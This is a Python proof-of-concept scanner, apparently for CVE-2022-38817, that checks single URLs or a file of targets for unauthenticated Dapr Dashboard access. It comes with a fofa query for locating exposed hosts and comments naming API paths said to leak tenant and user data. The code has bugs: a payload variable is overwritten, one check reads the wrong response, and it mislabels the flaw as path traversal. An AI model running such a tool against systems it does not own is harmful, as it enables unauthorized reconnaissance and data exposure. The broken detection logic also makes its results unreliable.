#!/usr/bin/env python
# -*- conding:utf-8 -*-
# Dapr Dashboard 未授权访问
# fofa: title="Dapr Dashboard"
# "/api/registered-ue-context" 获取订阅者UE信息
# "api/tenant" 获取租客信息
# "/api/tenant/{tenantid}/user" 获取特定用户的信息
import requests
import argparse
import sys
import urllib3
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
  _____ __      __ ______          ___    ___   ___   ___           _  _     ___   ______  ____   _  _   
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |__ \         | || |   / _ \ |____  ||___ \ | || |  
| |      \ \  / / | |__    ______    ) || | | |   ) |   ) | ______ | || |_ | | | |    / /   __) || || |_ 
| |       \ \/ /  |  __|  |______|  / / | | | |  / /   / / |______||__   _|| | | |   / /   |__ < |__   _|
| |____    \  /   | |____          / /_ | |_| | / /_  / /_            | |  | |_| |  / /    ___) |   | |  
 \_____|    \/    |______|        |____| \___/ |____||____|           |_|   \___/  /_/    |____/    |_| 
                                                               
                                                                                          
                                                                                        Author:Henry4E36
               """, color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        color = "red"
        payload1 = self.url + "/components/statestore"
        payload2 = self.url + "/overview"
        payload2 = self.url + "/controlplane"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }

        status = []
        try:
            res1 = requests.get(url=payload1, headers=headers, verify=False, timeout=5)
            res2 = requests.get(url=payload2, headers=headers, verify=False, timeout=5)
            res3 = requests.get(url=payload2, headers=headers, verify=False, timeout=5)
            if res1.status_code == 200 and "<title>Dapr Dashboard</title>" in res1.text:
                status.append("True")
            else:
                status.append("False")
            if res2.status_code == 200 and "<title>Dapr Dashboard</title>" in res2.text:
                status.append("True")
            else:
                status.append("False")
            if res3.status_code == 200 and "<title>Dapr Dashboard</title>" in res2.text:
                status.append("True")
            else:
                status.append("False")
            print(status)
            if "True" in status:
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在路径遍历！",color)
            else:
                print(f"[x]  目标系统: {self.url} 不存在路径遍历！")

        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Dapr Dashboard 未授权访问')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-38817.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-38817.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()